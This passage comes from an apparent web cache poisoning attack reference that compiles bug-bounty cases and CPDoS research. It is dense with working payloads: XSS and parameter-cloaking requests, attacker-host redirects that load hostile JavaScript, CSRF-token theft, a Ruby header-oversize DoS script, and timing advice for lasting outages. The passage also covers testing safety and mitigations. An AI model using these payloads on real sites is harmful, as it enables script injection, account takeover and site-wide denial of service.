The regex removes `_=payload` but leaves `q=help?` with a trailing `?`, poisoning the `q` parameter. **Constraint:** can only poison parameters containing `?`.

**Technique 2 — Akamai `akamai-transform` cloaking:**
```
GET /en?x=1&akamai-transform=payload-goes-here HTTP/1.1
Host: redacted.com

→ X-True-Cache-Key: /L/redacted.akadns.net/en?x=1 vcd=1234 cid=__
```
`akamai-transform` is excluded from the key.

**Bypass via malformed query string:**
```
GET /en?x=1?akamai-transform=payload-goes-here HTTP/1.1
Host: redacted.com

→ X-True-Cache-Key: /L/redacted.akadns.net/en?x=1 vcd=1234 cid=__
```
Akamai's URL parser treats `?akamai-transform=...` as part of the `x` parameter value, but the cache key still only contains `x=1`. **Note:** Akamai sites using `akamai-transform` deliberately may have an internal bit set that blocks this.

**Technique 3 — Ruby on Rails semicolon delimiter:**
On one target, scans detected suspicious behavior but no suitable cache oracle was available. Looking up the target cache's source code instead led to the discovery that **Ruby on Rails treats `;` as a parameter delimiter, just like `&`**.

```
/?param1=test&param2=foo
/?param1=test;param2=foo
```

This parsing quirk has numerous security implications. On a system configured to exclude `utm_content` from the cache key:

**Attack on JSONP endpoints:**
```
GET /jsonp?callback=legit&utm_content=x;callback=alert(1)// HTTP/1.1
Host: example.com
```
- Cache sees one keyed parameter: `callback=legit` (entire `utm_content` parameter excluded)
- Rails sees three parameters: `callback=legit`, `utm_content=x`, `callback=alert(1)//`
- Rails prioritizes the **second** `callback` value → `alert(1)//`
- Poisoned JSONP callback cached for `/jsonp?callback=legit`

#### C. Unkeyed HTTP Method
Some caches exclude the HTTP method from the cache key, treating GET and POST responses as equivalent.

**Attack on online mapping platform (taobao.com):**
```
POST /view/o2o/shop HTTP/1.1
Host: alijk.m.taobao.com

_wvUserWkWebView=a</script><svg onload='alert&lpar;1&rpar;'/data-
```
- POST body contains XSS payload
- Origin reflects it in JSON response
- Cache stores the response under the GET key
- All subsequent GET requests receive the XSS payload

**Key insight:** POST requests are often less scrutinized by WAFs and may allow payloads that GET requests block.

#### D. Fat GET Requests
There's a variation of the unkeyed-method technique that works on far more systems, hinted at in Varnish's release notes:

> *Whenever a request has a body, it will get sent to the backend for a cache miss…*
> *…the builtin.vcl removes the body for GET requests because it is questionable if GET with a body is valid anyway (but some applications use it)*

This is bad news for websites that use Varnish **without** the `builtin.vcl` snippet in conjunction with a framework that supports GET requests with bodies ("fat GET requests").

When a cache sees a GET request, it may not include the request body in the cache key. If the origin (e.g., Rails, PHP) processes the GET body as form data, the body parameters override URL parameters without changing the cache key.

**Vulnerable stacks:** Varnish (without builtin.vcl), Cloudflare, Rack::Cache

**GitHub ($10,000):**
On every cacheable page on GitHub, a fat GET could be used to poison the cache and change any parameter to a value of the attacker's choice.
```
GET /contact/report-abuse?report=albinowax HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim
```
- Cache key: `/contact/report-abuse?report=albinowax`
- Origin processes body → `report=innocent-victim`
- Anyone reporting abuse on `albinowax` would instead report `innocent-victim`

Using the same technique it was also possible to persistently apply and change issue filters, deny access to topic pages, disable the "raw" button on most repos, etc. GitHub patched this and awarded a $10k bounty.

**Gadget impact observation:** The fat GET technique gives more control over which inputs to poison than earlier techniques, but the examples on GitHub and Zendesk have lower impact than the full site takeovers seen with query-string poisoning. This is because the impact of cache poisoning is hugely dependent on available gadgets. A powerful primitive like "make arbitrary unkeyed changes to arbitrary parameters on cacheable pages" means there's a big pool of potential gadgets, but it's the **quality of the gadget** that determines the ultimate impact. Being able to recognize potential gadgets is crucial to high-severity attacks.

**Zendesk login-CSRF:**
It isn't just misconfigured Varnish servers that forward fat GET requests without including body parameters in the cache key — all Cloudflare systems do the same, as does Rack::Cache. Cloudflare "patched" it by adding "Do not trust GET request bodies" to their documentation. One viable target was the very site this warning was hosted on; it used Zendesk (built on Rails).
```
GET /en-us/signin HTTP/1.1
Host: example.zendesk.com
Content-Length: 200

return_to=/access/logout?return_to=/./access/return_to?flash_digest=secret-token%2526return_to=/final-page?foo=foo%252526bar=bar
```
- Origin uses body parameter for `return_to`
- Victim clicks login → redirected through attacker-controlled chain
- Attacker gains custody of tickets created by the victim

**Note:** Rails+Cloudflare stacks remain vulnerable if the origin processes fat GETs.

#### E. Cache Key Normalization (URL Decoding in Key)
Even something as simple as URL normalization can have serious consequences when applied to a cache key. When the cache decodes URL-encoded characters for cache key generation but the origin does not, two semantically different requests collide on the same cache key.

**Firefox update takedown (download.mozilla.org):**
Firefox periodically checks for updates by issuing requests to `download.mozilla.org`:
```
GET /?product=firefox-73.0.1-complete&os=osx&lang=en-GB&force=1 HTTP/1.1
Host: download.mozilla.org
```
The Nginx cache key configuration was:
```
proxy_cache_key $http_x_forwarded_proto$proxy_host$uri$is_args$args;
```
There's no issue with the `proxy_cache_key` setting here — it's very similar to nginx's default. But nginx's documentation for `proxy_pass` states:

> *If proxy_pass is specified without a URI, the request URI is passed to the server in the same form as sent by a client when the original request is processed*

The phrase "in the same form" hints that the forwarded request **won't be normalized**, whereas the request components stored in the cache key **may be**. One form of normalization that nginx applies to the cache key is a full URL-decode.

**Payload:**
```
GET /%3fproduct=firefox-73.0.1-complete&os=osx&lang=en-GB&force=1 HTTP/1.1
Host: download.mozilla.org
```
- Cache key: `/?product=firefox-73.0.1-complete&os=osx&lang=en-GB&force=1` (decoded `%3f` → `?`)
- Origin receives raw `/%3fproduct=...` → bounces to `https://www.mozilla.org/` (broken redirect)
- All subsequent legitimate Firefox update requests receive the broken redirect
- **Impact:** Global denial of Firefox updates

As Firefox updates often contain critical security fixes, this is quite serious.

**Encoded XSS via normalization (Cache Magic Trick):**
Browsers URL-encode dangerous characters, making reflected XSS "unexploitable":
```
GET /?x="/><script>alert(1)</script> HTTP/1.1
Host: example.com

→ Response reflects
<a href="/?x="/><script>alert(1)</script>
```

But in a modern browser, the request becomes:
```
GET /?x=%22%2F%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E HTTP/1.1
Host: example.com

→ Response safely encodes the payload
```

Luckily, cache-key normalization means these two requests have the **same key**. We can exploit arbitrary browsers by simply issuing the unencoded attack ourselves before directing the victim to the URL:
```
GET /?x=%22%2F%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E HTTP/1.1
Host: example.com

→ Cache stores unencoded response (attacker sends encoded)

GET /?x="/><script>alert(1)</script> HTTP/1.1
Host: example.com
→ X-Cache: HIT
→ Response contains unencoded XSS
```
Attacker sends the encoded request first (poisoning the cache), then directs victim to the encoded URL. The victim's browser naturally encodes the characters, but the cached response is already unencoded and executes.

#### F. Cache Key Injection
Another classically unexploitable issue is client-side vulnerabilities affecting keyed headers, for example, XSS in the `Origin` header. If the cache bundles all key components into a string without bothering to escape delimiters, we can craft two requests that have the same cache key even though they are semantically completely different.

**Akamai cache key injection:**
```
GET /?x=2 HTTP/1.1
Origin: '-alert(1)-'__

→ X-True-Cache-Key: /D/000/example.com/ cid=x=2__Origin='-alert(1)-'__
```

**Collision attack:**
```
GET /?x=2__Origin='-alert(1)-' HTTP/1.1
Host: example.com

→ X-True-Cache-Key: /D/000/example.com/ cid=x=2__Origin='-alert(1)-'__
→ X-Cache: TCP_HIT
→ Response contains reflected XSS
```
By sending the first request (with injected `__Origin='-alert(1)-'__`), the attacker poisons the cache. Then they direct the victim to the second URL (`?x=2__Origin='-alert(1)-'`), which has the **same cache key** but is a completely different, benign-looking request. If this strategy works on the `Host` header, the attacker can likely get full control over every website using the target CDN.

**Cloudflare cache key injection:**
Cloudflare's documented default key:
```
${header:origin}::${scheme}://${host_header}${uri}
```
This was theoretically vulnerable to delimiter injection:
```
GET /foo.jpg?bar=x HTTP/1.1
Host: example.com
Origin: http://evil.com::http://example.com/foo.jpg?bar=x

GET /foo.jpg?bar=argh::http://example.com/foo.jpg?bar=x HTTP/1.1
Host: example.com
Origin: http://evil.com
```
When this didn't work directly, the documentation was corrected. Cloudflare acknowledged it was "theoretically possible to construct a cache collision" and patched the issue by escaping delimiters. The attack vector is now closed.

#### G. Relative Path Overwrite (RPO) + Cache Poisoning
The foothold that cache poisoning gives us in page subresources has a wonderful symbiosis with relative path overwrite (RPO) attacks. RPO attacks trick browsers into mis-resolving path-relative stylesheet imports (`<link rel="stylesheet" href="style.css"/>`) by using server-side path normalization. As the attacker typically doesn't control the query string, they are often unable to inject malicious CSS into the HTML page, hampering such attacks. Cache poisoning gives us a way to inject malicious CSS in advance, making this niche vulnerability far more exploitable.

**Synergy:**
1. Attacker poisons the HTML page to contain `<style>` or CSS syntax in the query-reflected content
2. Browser loads the "stylesheet" (which is actually the poisoned HTML response)
3. Browser walks through the document until it finds valid CSS, then executes it

**Resource files as gadgets:**
Resource files like JS and CSS are mostly static, but some reflect input from the query string. This is typically harmless as browsers won't execute such files when viewed directly, but it makes for fantastic cache-poisoning gadgets. If we can inject content into a resource file, we get control over every page that imports that resource, even if it's cross-domain.

**Attack on CSS import reflection:**
```
GET /style.css?x=a);@import... HTTP/1.1
Host: example.com

→ @import url(/site/home/index-part1.css?x=a);@import...
```
The query string is reflected inside the CSS import. Attacker can inject `@import url(evil.com)` or exfiltration CSS.

**Error page CSS injection:**
```
GET /foo.css?x=alert(1)%0A{}*{color:red;} HTTP/1.1
Host: example.com

→ HTTP/1.1 200 OK
→ Content-Type: text/html
→ "This request was blocked due to… alert(1)\n{}*{color:red;}"
```
If the importing page lacks a `<!DOCTYPE>`, the browser will execute CSS found anywhere in the HTML response.

#### H. Internal Cache Poisoning
On the opposite end of the spectrum from CDN edge caches, some attacks are so practical it's impossible to perform them safely. Internal, application-layer caches often cache **fragments** of responses individually and don't really have the concept of a cache key. This means by poisoning one fragment, you may inadvertently poison every page on the site.

**Adobe Blog / WP Rocket Cache:**
After probing a potential cache poisoning issue on Adobe's blog with the following request, a prolonged flood of traffic arrived at the attacker's Collaborator server, originating from all over the website:
```
GET /access-the-power-of-adobe-acrobat?dontpoisoneveryone=1 HTTP/1.1
Host: theblog.adobe.com
X-Forwarded-Host: collaborator-id.psres.net
```
It turned out that they were using an integrated application-level cache called **WP Rocket Cache**. By sending that request, the attacker had inadvertently poisoned every page on the site, including the homepage where every link now pointed to the attacker's domain:
```
GET / HTTP/1.1
Host: theblog.adobe.com

HTTP/1.1 200 OK
X-Cache: HIT - WP Rocket Cache
...
<script src="https://collaborator-id.psres.net/foo.js"/>
...
<a href="https://collaborator-id.psres.net/post">…
```
This was not an ideal outcome. As there was no way to "undo" the attack, the only option was to turn off the Collaborator server and reach out to Adobe's security team, who resolved it in under 20 minutes.

**Blind Cache Poisoning (DoD Intelligence Website):**
As internal caches don't have cache keys, it's possible to poison pages you don't even have access to. This was discovered by accident while evaluating a DoS technique — the technique universally failed, but it triggered traffic to the attacker's server from an internal administration panel on a US Department of Defense intranet.

The site was only accessible internally, so any external access caused a server-level redirect to the intranet. However, the DoS technique broke the redirect and triggered an error page, poisoning the internal cache in the process.

**Recognizing Internal Cache Poisoning:**
Since external caches almost always save entire responses, one key indicator of internal cache poisoning is when you see **both old and new canaries appearing in a single response**. Canaries appearing on different pages from the ones you injected is another good indicator, as is the use of inconsistent hostnames that resolve to the same application.

**Safety mitigation:** Whenever you specify a hostname that isn't the target's, make sure that it's a site you control. You do not want to end up routing your target's visitors to evil.com, unless you are the lucky owner of evil.com.

### 4.4 Implementation Flaw Attacks (Key Generation Discrepancies)

#### A. Unkeyed Port
```
Host: target.com:1337
```
If cache key drops port but application retains it. Can redirect to dead socket or (with non-numeric ports) inject payloads.

#### B. Full Query String Excluded
Some caches exclude entire query string from key. Alternative cache busters:
```
Accept-Encoding: gzip, deflate, cachebuster
Accept: */*, text/cachebuster
Cookie: cachebuster=1
Origin: https://cachebuster.target.com
```

Reflected XSS in query parameter poisons the bare path for all normal traffic.

#### C. Path Splitting Discrepancies
| Tech | Payload | Behavior |
|------|---------|----------|
| Apache | `GET //path` | Normalizes to `/path` |
| Nginx | `GET /%2Fpath` | Normalizes to `/path` |
| PHP | `GET /index.php/xyz` | PHP ignores extra path |
| .NET | `GET /(A(xyz)/` | Session-based path parsing |

#### D. Parameter Cloaking
**Technique 1 — Malformed query strings:**
```
GET /?example=123?excluded_param=bad-stuff-here
```
Cache treats substring as separate excluded variable. Server reads one long value.

**Technique 2 — Semicolon delimiter mismatch:**
```
GET /?keyed_param=abc&excluded_param=123;keyed_param=bad-stuff-here
```
Cache registers first `keyed_param=abc`. Backend honors final duplicate (framework treats `;` as delimiter).

**Target:** JSONP endpoints like `/jsonp?callback=innocentFunction`

#### E. Fat GET Requests
If method/body is unkeyed, backend may prefer POST body over URL parameter:
```
GET /?param=innocent
Content-Type: application/x-www-form-urlencoded

param=bad-stuff-here
```

Or with override header:
```
X-HTTP-Method-Override: POST
```

#### E2. Method Override Poisoning (GitLab / GCP Case — #1160407)
Some cloud storage backends (e.g., Google Cloud Storage) support `X-HTTP-Method-Override` and will execute the overridden method while the cache key remains based on the original method.

**Attack:**
```
GET /static/app.js HTTP/1.1
Host: gitlab.com
X-HTTP-Method-Override: HEAD
```
- GCS returns `200 OK` with `Content-Length: 0` (HEAD response)
- Cache stores empty body under `GET /static/app.js` key
- All legitimate users requesting that JS file receive zero bytes
- **Impact:** Complete site breakage (DoS on static assets)

**Detection:** Check if cache distinguishes between `GET` and `HEAD` responses. If not, any method override can poison static assets.

#### F. Resource Import Poisoning
```
GET /style.css?excluded_param=alert(1)%0A{}*{color:red;}
```
If stylesheet echoes excluded variables, CSS injection is possible.

#### F2. Reflected Cookie Injection (jQuery $.getScript Bypass)
When WAF blocks conventional XSS strings but the target uses jQuery, backtick syntax can invoke `$.getScript`:

**Real-world payload:**
```
GET /resource.otf?cb=1 HTTP/1.1
Cookie: n_vis=malicious_payload
```
- Cookie reflected inside a `<script>` block in the cached response
- jQuery processes the backtick-wrapped payload as executable code
- **Impact:** Stored XSS without needing traditional `<script>` tags

**Test reflection in:** every header, cookie, custom field, and `X-Forwarded-*` derivative.

#### G. Key Normalization Weakness (Encoding Discrepancy)
```
GET /example?param="><test>
GET /example?param=%22%3e%3ctest%3e
```
If cache decodes `%22%3e%3ctest%3e` → `"><test>` for key generation, both requests share one cache entry.

**Attack:** Store unencoded payload. Victims sending encoded characters still hit poisoned record.

#### H. Cache Key Injection
```
Origin: '-alert(1)-'__
```
Poor escaping of composite key separators allows header data to bleed into the key itself.

Victim browsing address literally containing `__Origin='-alert(1)-'__` matches tainted key.

#### I. Poisoning Internal / Fragment Caches
Signs of fragment caching:
- Blended input from prior requests appearing in responses
- Reflections on pages where payload was never injected
- Request behavior inconsistent across different paths

**Risk:** Standard cache busters often fail. Use only attacker-controlled domains for probes to limit collateral damage.

#### J. Capitalized Host Header Poisoning
If the cache lowercases `Host` for key generation but forwards the original casing to the origin, the backend may return a different page (virtual-host mismatch, debug output, or redirect).

**Attack:**
```
GET /page HTTP/1.1
Host: TARGET.COM
```
- Cache key uses `target.com`
- Origin receives `TARGET.COM` → 301 redirect, error page, or different content
- Different response cached for all normal requests

#### K. Fastly-Host Cross-Origin Poisoning
Fastly VCL often validates the `Host` header against a whitelist but uses `Fastly-Host` (or a derived variable) to generate the cache key. If the origin is reached with the raw `Host` header while the cache key is built from `Fastly-Host`, an attacker can swap origins behind the same load balancer.

**Attack:**
```
GET /test.html HTTP/1.1
Host: redacted-cdn.com
Fastly-host: assets.redacted.com
```
- Fastly validates `assets.redacted.com` against the whitelist
- Cache key is built for `assets.redacted.com/test.html`
- Origin serves `redacted-cdn.com/test.html` (which may contain DOM-XSS or other gadgets)
- Response cached as `assets.redacted.com/test.html`

**Impact:** DOM-XSS on a benign domain by caching poisoned content from an attacker-controllable or buggy sibling origin.

#### L. Encoded Duplicate Parameter Keyed Injection
CDNs that extract specific GET parameters for the cache key (e.g., image size) may treat encoded parameter names as distinct keys while the backend normalizes them.

**Attack:**
```
GET /images/logo.png?size=32x32&siz%65=0 HTTP/1.1
```
- Cache key includes `size=32x32` (ignores `%65` because it is not literally `size`)
- Backend URL-decodes the query string → `size=0`
- Backend returns `400 Bad Request` (invalid size)
- Cache stores 400 under the legitimate `size=32x32` key
- All normal image requests receive the error

**Generalization:** Any parameter whose name decoding happens only on the backend can be used to override keyed values without changing the cache key.

#### M. Storage Bucket Authorization Header Poisoning
When S3 or Azure Blob Storage sits behind a CDN that caches 403 responses by default, sending an invalid `Authorization` header poisons the cache for the requested object.

**S3 + Cloudflare (pre-August 2021 default):**
```
GET /static/main.js HTTP/1.1
Host: redacted.com
Authorization: AWS4-HMAC-SHA256 Credential=...
x-amz-content-sha256: STREAMING-AWS4-HMAC-SHA256-PAYLOAD
```
- S3 returns `403 Forbidden`
- Cloudflare cached 403 by default (even without `Cache-Control`)
- All subsequent requests receive the cached 403

**Azure Storage (Exodus — $2,500):**
```
GET /exodus-linux-x64-21.4.9.zip HTTP/1.1
Host: downloads.exodus.com
Authorization: SharedKeyLite myaccount: ctZ...
```
- Azure returns `403 Forbidden`
- CDN caches the 403
- **Result:** Installer downloads blocked for all users

**Note:** Cloudflare updated default configuration on August 3, 2021 to stop caching 403 responses without explicit cache directives. Other CDNs and origin configurations may still be vulnerable.

---

## 5. CACHE-WHAT-WHERE ADVANCED TECHNIQUE

**Concept:** Store effects of vulnerabilities that are normally "unexploitable" because they require specific headers or user interaction.

### 5.1 Open Redirect via Header → Cache Poisoning
```
GET /main.js HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
```
- Endpoint returns 302 redirect based on `X-Forwarded-Host`
- Redirect is normally uncacheable
- Parser discrepancy stores 302 under `/main.js` key
- Victims loading homepage fetch `/main.js`, get redirected, load attacker-controlled JS

### 5.2 Cacheable Redirect for Site Defacement
If origin marks redirect as cacheable:
```
Cache-Control: public, max-age=3600
```
Arbitrary cache poisoning and site defacement without needing static extension.

### 5.2a Cached 301 Redirect Loop on Root Path (Site-Wide DoS)
**Target:** Ruby on Rails applications (or any framework that respects `X-Forwarded-Scheme`) behind Cloudflare or similar CDN.

**Attack:**
```
GET /?xxx HTTP/2
Host: redacted.com
X-Forwarded-Scheme: http
```
**Response:**
```
HTTP/2 301 Moved Permanently
Location: https://redacted.com/
Cf-Cache-Status: HIT
Age: 3
```

**Mechanism:**
1. The application sees `X-Forwarded-Scheme: http` but the actual request is HTTPS
2. Framework generates a 301 redirect to force HTTPS
3. The 301 response gets cached under the root path key (`/`)
4. All subsequent visitors to `https://redacted.com/` receive the cached 301
5. They redirect to `https://redacted.com/` — a redirect loop
6. **Result:** Complete denial of access to the site until cache expires

**Timing the attack:**
```
Age: 3
Cache-Control: public, max-age=3600
```
Calculate refresh window: `3600 - 3 = 3597` seconds remaining. Send poison request right after cache refresh for maximum impact duration.

**Key insight:** This works on the **root path** `/` itself, not just static assets. Much higher impact than static file poisoning.

**Always use cache busters during testing:**
```
GET /?xxx HTTP/2          # xxx = unique cache buster
```
This prevents accidentally poisoning live traffic during reconnaissance.

### 5.3 Self-Reflected XSS Stored in Cache
A reflected XSS that requires direct victim interaction becomes stored via cache poisoning, hitting all visitors.

### 5.4 Cache Deception → Account Takeover Chaining
**Real-world chain ($16,500 series):**

**Step 1 — Find self-XSS in profile/name-change function**
```
"xss","a":top[8680439..toString(30)](document.domain),//
```
This obfuscated payload bypasses naive filters by using `toString(30)` to generate `alert`.

**Step 2 — Weaponize via cache deception**
Append cacheable static extension to dynamic endpoint:
```
/my-account/personal-information.woff2?triagethis
```
Akamai caches the private response containing victim's anti-CSRF token.

**Step 3 — Retrieve stolen CSRF token**
Fetch the cached URL unauthenticated. Extract `CSRFToken` from response.

**Step 4 — Deliver invisible auto-submit form**
```html
<form action="/my-account/update-profile" method="POST" style="display:none">
```

### 5.5 Cache Poisoning for Persistent DoS (James Kettle Research)

Web cache poisoning enables **single-request, persistent DoS** attacks. Unlike traditional DoS, these require no volume and affect all subsequent visitors to the poisoned resource.

**The `dontpoisoneveryone` parameter:**
```
GET /en_GB/roadster?dontpoisoneveryone=1 HTTP/1.1
```
Always append a unique cache-busting parameter during testing. This proves the vulnerability without causing actual site downtime.

#### A. WAF Block Page Poisoning (Tesla — $300)
**Technique:** Trigger WAF block and cache the 403 response.
```
GET /en_GB/roadster?dontpoisoneveryone=1 HTTP/1.1
Host: www.tesla.com
Any-Header: burpcollaborator.net

HTTP/1.1 403 Forbidden
Access Denied. Please contact waf@tesla.com
```
- WAF sees `burpcollaborator.net` in any header → returns cacheable 403
- Cache key does **not** include the header containing the trigger
- All subsequent visitors to `/en_GB/roadster` receive "Access Denied"
- **Impact:** Complete denial of access to that page for all users

**Generalization:** Any cacheable WAF block response triggered by an unkeyed header can be weaponized for DoS.

#### B. Invalid Port Redirect Timeout (HackerOne — $2,500)
**Technique:** Poison redirect with invalid port causing connection timeout.
```
GET /index.php?dontpoisoneveryone=1 HTTP/1.1
Host: www.hackerone.com
X-Forwarded-Port: 123

HTTP/1.1 302 Found
Location: https://www.hackerone.com:123/
```
- Redirect to `https://www.hackerone.com:123/` causes timeout (port closed)
- Cached under `/index.php` key
- All visitors timeout trying to access the poisoned path
- **Impact:** Persistent denial of service until cache expires

#### C. Invalid Transfer-Encoding (PayPal — $9,700)
**Technique:** Invalid `Transfer-Encoding` header causes "501 Not Implemented" cached for JS files.
```
GET /important.js HTTP/1.1
Host: www.paypalobjects.com
Transfer-Encoding: invalid

HTTP/1.1 501 Not Implemented
```
- Origin rejects malformed `Transfer-Encoding` with 501
- 501 response cached under `/important.js` key
- All users receive 501 instead of JS → core functionality breaks
- **Impact:** Site-wide functional degradation

#### D. Underscore Header Variant (Instagram — $1,000)
**Technique:** `Accept_Encoding: br` (underscore instead of hyphen) forces brotli encoding.
```
GET /page HTTP/1.1
Host: instagram.com
Accept_Encoding: br
```
- `Accept-Encoding` is **keyed** → normal requests use their own encoding
- `Accept_Encoding` (with underscore) is **unkeyed** → cache ignores it
- Origin sees `Accept_Encoding: br` → returns brotli-encoded response
- Response cached under key without encoding variant
- Users with old browsers or proxies cannot decode brotli → broken page
- **Impact:** DoS for specific user segments

**Key insight:** Many caches normalize header names (lowercase, hyphen handling) but some miss underscore variants.

#### E. Invalid Range Header (Twitter — Unpatched)
**Technique:** Invalid `Range` value causes 400 cached for JS files.
```
GET /core.js HTTP/1.1
Host: abs.twimg.com
Range: bytes=cow

HTTP/1.1 400 Bad Request
```
- Origin rejects nonsensical `Range: bytes=cow` with 400
- 400 response cached under `/core.js` key
- All users requesting that JS file receive 400
- **Impact:** Missing core JS → site unusable

#### F. Scheme Contradiction (Bitbucket — $1,800)
**Technique:** `X-Forwarded-SSL` contradicts actual scheme.
```
GET /page HTTP/1.1
Host: bitbucket.org
X-Forwarded-SSL: off

HTTP/1.1 400 Bad Request
Contradictory scheme headers
```
- Response "Contradictory scheme headers" gets cached
- All subsequent visitors receive the error

#### G. User-Agent Accidental Poisoning (Undisclosed — $7,500)
**Technique:** Unusual User-Agent triggers browser-update page.
- Burp Repeater's "Paste URL as request" used IE9 User-Agent
- Origin returned "Please update your browser" page
- Response cached under the normal page key
- All subsequent visitors (regardless of browser) received the update page
- **Impact:** Complete page denial for all users

#### H. Other Headers to Test for DoS
Based on successful bounty reports, test these headers for cacheable error responses:
```
Accept: invalid/mime-type
Upgrade: invalid-protocol
Origin: malformed
Max-Forwards: 0
Transfer-Encoding: chunked, invalid
Range: bytes=invalid
X-Forwarded-SSL: off
Accept_Encoding: br        (underscore variant)
```

**Tooling tip:** Param Miner has a "twitchy cache poison" option that increases sensitivity for detecting these subtle cache poisoning vectors.

#### I. Bug Bounty Policy Nuance
Most bug bounty policies discourage DoS attacks, but the wording matters:
- **"Forbids launching DoS attacks"** → You can REPORT DoS vulnerabilities; just don't launch them
- **"Excludes all DoS vulnerabilities"** → Do not report

**Recommendation for programs:** Exclude "volumetric DoS" or "computational DoS" rather than all DoS. Web cache poisoning DoS is a single-request, application-level vulnerability with no volume involved.

#### J. Scanner User-Agent Blocking (Multiple Targets)
Some origins block requests from security scanners by User-Agent string alone and return a cacheable `403 Forbidden`.

**Payload:**
```
GET /index.html HTTP/1.1
Host: redacted.com
User-Agent: Fuzz Faster U Fool
```
- Response: `403 Forbidden`
- CDN caches the 403 under the normal page key
- All legitimate visitors receive the block page

**Note:** This has been reproduced with User-Agent strings from FFUF, Nuclei, and other common tools.

#### K. Invalid Content-Type (GitHub — $7,500)
Sending an invalid `Content-Type` request header to GitHub repositories caused the origin to return `406 Not Acceptable`. GitHub keyed the cache on the authentication cookie, so authenticated users were unaffected, but all **unauthenticated** users shared the same cache key.

**Payload:**
```
GET /iustin24/Cache-Key-Normalization-Denial-of-Service HTTP/2
Host: github.com
content-type: iustin
```
- Response: `406 Not Acceptable`
- Cached for unauthenticated visitors
- **Result:** Repository completely inaccessible to logged-out users

**Key insight:** Even when session cookies are included in the cache key, unauthenticated traffic often shares a single key, making DoS against anon users trivial.

#### L. Cloudflare 403 Default Caching (S3/Azure Buckets)
Up until August 3, 2021, Cloudflare cached `403 Forbidden` responses by default when no `Cache-Control` directive was present. Any S3 or Azure Blob proxied through Cloudflare could be permanently blocked by sending a single malformed `Authorization` request.

**Impact:** Single-request DoS on any static file hosted in a cloud storage bucket behind Cloudflare. Cloudflare has since patched this default behavior.

### 5.6 Cache-Poisoned Denial of Service (CPDoS) — Academic Research (Nguyen & Lo Iacono)

CPDoS is a formalized class of web cache poisoning attacks that weaponize semantic gaps between cache and origin processing to cause persistent denial of service. **A single crafted request is sufficient to block all subsequent access to a targeted resource** distributed via CDNs or proxy caches.

**Attack Flow:**
1. Attacker sends HTTP request with malicious header targeting a victim resource
2. Cache forwards request (header appears unobtrusive to cache logic)
3. Origin server processes request → error triggered by malicious header
4. Origin returns error page
5. Cache stores error page under the target resource's key
6. All legitimate users receive the cached error instead of genuine content

#### A. HTTP Header Oversize (HHO)
**Root cause:** Semantic gap in header size limits between cache and origin.

| System | Typical Header Size Limit |
|--------|---------------------------|
| Apache HTTPD | ~8,192 bytes |
| Most web servers/proxies | ~8,192 bytes |
| Amazon CloudFront CDN | ~20,480 bytes |

**Attack:** Send a request header larger than the origin's limit but smaller than the cache's limit.

**Payload:**
```ruby
require 'net/http'
uri = URI("https://example.org/index.html")
req = Net::HTTP::Get.new(uri)

num = 200
i = 0
until i > num do
    req["X-Oversized-Header-#{i}"] = "Big-Value-0000000000000000000000000000000000"
    i += 1
end

res = Net::HTTP.start(uri.hostname, uri.port, :use_ssl => uri.scheme == 'https') {|http|
    http.request(req)
}
```

**Result:** Origin returns `400 Bad Request` (header too large); cache stores it; all subsequent requests receive error.

**Alternative:** Use one single oversized header key or value instead of many small headers.

#### B. HTTP Meta Character (HMC)
**Root cause:** Cache forwards harmful meta characters without sanitization; origin rejects them.

**Meta characters to test:**
- Line break / carriage return: `\n` (`%0a`), `\r` (`%0d`)
- Bell character: `\a`
- Null byte: `%00`
- Other control characters

**Attack:**
```
GET /index.html HTTP/1.1
Host: example.org
X-Meta: value\r\nmalicious-header: value
```

**Result:** Origin classifies request as malicious → returns error → cache stores error → DoS.

#### C. HTTP Method Override (HMO)
**Root cause:** Cache sees GET request; origin interprets it as overridden method (e.g., POST); framework returns error.

**Headers that trigger method override:**
```
X-HTTP-Method-Override: POST
X-HTTP-Method: POST
X-Method-Override: POST
```

**Attack:**
```
GET /index.html HTTP/1.1
Host: example.org
X-HTTP-Method-Override: POST
```

**Result:**
- Cache interprets as benign GET request to `/index.html`
- Web application (e.g., Play Framework 1) interprets as POST to `/index.html`
- If no POST logic exists → returns `404 Not Found`
- Cache stores 404 as the GET response
- All subsequent GET requests receive 404

**Note:** This is the same vector as GitLab #1160407 but formalized in CPDoS research.

#### D. CPDoS Vulnerability Matrix (Cache × Origin)

**Key findings from Nguyen & Lo Iacono research (2019):**

| Cache | Vulnerable To | With These Origins |
|-------|---------------|-------------------|
| **CloudFront** | HHO, HMC | Apache HTTPD, IIS, Varnish, Amazon S3, GitHub Pages, Heroku, Spring Boot |
| **CloudFront** | HHO | Nginx, Tomcat, Rails, Laravel, Symfony, Django |
| **CloudFront** | HMC | GitLab Pages, BeeGo, Express.js, Gin, Laravel, Meteor.js, Rails, Symfony |
| **CloudFront** | HMO | Play 1, Flask |
| **Akamai** | HHO | IIS, ASP.NET |
| **Akamai** | HMC | IIS, ASP.NET |
| **Akamai** | HMO | Play 1, Flask |
| **Varnish** | HMO | Play 1 |
| **Azure** | HHO | IIS, ASP.NET |
| **Fastly** | HHO | IIS, ASP.NET |

**Highest-impact combinations:**
- **CloudFront + Apache HTTPD:** HHO, HMC
- **CloudFront + IIS:** HHO, HMC
- **CloudFront + Play 1:** HHO, HMO, HMC
- **Akamai + IIS/ASP.NET:** HHO, HMC

#### E. Multi-Edge Propagation
Once poisoned at one edge, the CDN distributes the error page to other edge locations worldwide. TurboBytes Pulse and KeyCDN testing showed:
- Attacks from Frankfurt, DE → poisoned edges across Europe and Asia
- Attacks from Northern Virginia, US → poisoned edges across North America
- **Not all edges are infected** — some receive the genuine page depending on routing

#### F. Mitigations (From CPDoS Research)

**1. Caching standard compliance:**
The HTTP standard (RFC 7231) only allows caching these error codes:
- `404 Not Found`
- `405 Method Not Allowed`
- `410 Gone`
- `501 Not Implemented`

Caches should **never** cache `400 Bad Request` by default. This is the root cause of most CPDoS.

**2. Correct status codes:**
- **Wrong:** `400 Bad Request` for oversized headers
- **Wrong:** `404 Not Found` (IIS behavior)
- **Correct:** `431 Request Header Fields Too Large`
- **Critical:** `431` is **not cached by any web caching systems** according to CPDoS research

**3. Exclude error pages from caching:**
```
Cache-Control: no-store
```
Add to all error responses. Or disable error page caching in cache configuration (CloudFront, Akamai both support this).

**4. WAF placement:**
- **Correct:** WAF → Cache → Origin (WAF blocks malicious content before cache sees it)
